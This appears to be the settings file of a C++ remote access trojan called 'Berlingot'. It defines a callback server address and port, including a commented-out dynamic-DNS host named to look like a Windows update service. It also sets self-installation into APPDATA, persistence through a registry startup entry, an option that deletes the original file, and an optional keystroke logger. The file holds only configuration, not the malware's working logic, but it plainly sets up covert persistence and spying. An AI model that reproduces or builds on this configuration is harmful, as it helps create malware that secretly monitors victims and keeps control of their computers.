//
// Created by Berlingot on 2023-04-17.
//

#include "Settings.h"

std::string Settings::serverIP = "sample.ip.net";	/*windistupdate.ddns.net*/	//server ip
int Settings::serverPort = 1337;	//server port

std::string Settings::fileName = "Berlingot.exe";					//file name
std::string Settings::folderName = "Berlingot folder";					//name of folder where file is located
std::string Settings::startupName = "Berlingot startup";		//startup name in registry / taskmgr
std::string Settings::logFileName = "Berlingot.txt";								//name of log file
std::string Settings::installLocation = "APPDATA";			//install location (appdata, programdata etc)
bool Settings::installSelf = true;				//specifies whether the program should install itself
bool Settings::startOnNextBoot = false;		//specifies whether it should startup the installed clone of itself NOW or ON THE NEXT BOOT (ONLY IMPORTANT FOR INSTALLATION PROCESS)
bool Settings::meltSelf = false;				//specifies whether the installed clone should delete the initial file
bool Settings::setStartupSelf = true;			//specifies whether the program is to be started on system boot
bool Settings::logEvents = true;			//specifies whether the program should log events (like errors etc)
bool Settings::logKeys = false;		//[EARLY STAGE, VERY RESOURCE-DEMANDING]	//specifies whether the program should log the users keystrokes
